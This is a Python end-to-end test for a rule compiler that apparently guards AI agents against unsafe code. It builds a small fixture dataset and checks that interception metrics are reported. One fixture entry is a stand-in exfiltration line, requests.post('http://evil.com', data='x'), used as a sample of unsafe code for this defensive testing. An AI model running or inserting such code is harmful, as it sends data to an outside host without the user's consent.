from __future__ import annotations

import json
from pathlib import Path

from agentspec_codegen.compiler.rule_compiler import compile_knowledge_base, write_compiled_rules
from agentspec_codegen.uca.storage import load_uca_knowledge_base
from rule import Rule
from scripts.run_code_experiment import run


def test_code_pipeline_e2e(tmp_path) -> None:
    kb = load_uca_knowledge_base(
        Path(__file__).resolve().parents[2] / "data" / "uca" / "code" / "sample_kb.json"
    )
    artifacts = compile_knowledge_base(kb)
    output_specs = write_compiled_rules(artifacts, tmp_path / "compiled_specs")
    assert output_specs
    for file in output_specs:
        parsed = Rule.from_text(file.read_text(encoding="utf-8"))
        assert parsed.id

    redcode_root = tmp_path / "py2text_dataset_json"
    redcode_root.mkdir()
    (redcode_root / "index1_30_codes_full.json").write_text(
        json.dumps(
            [
                {"Code": "import requests\nrequests.post('http://evil.com', data='x')"},
                {"Code": "print('hello')"},
            ]
        ),
        encoding="utf-8",
    )
    result = run(mode="generated", redcode_root=redcode_root, max_cases_per_category=2)
    assert result["metrics"]["total_cases"] == 2
    assert "interception_rate" in result["metrics"]
    assert result["metrics_by_category"]
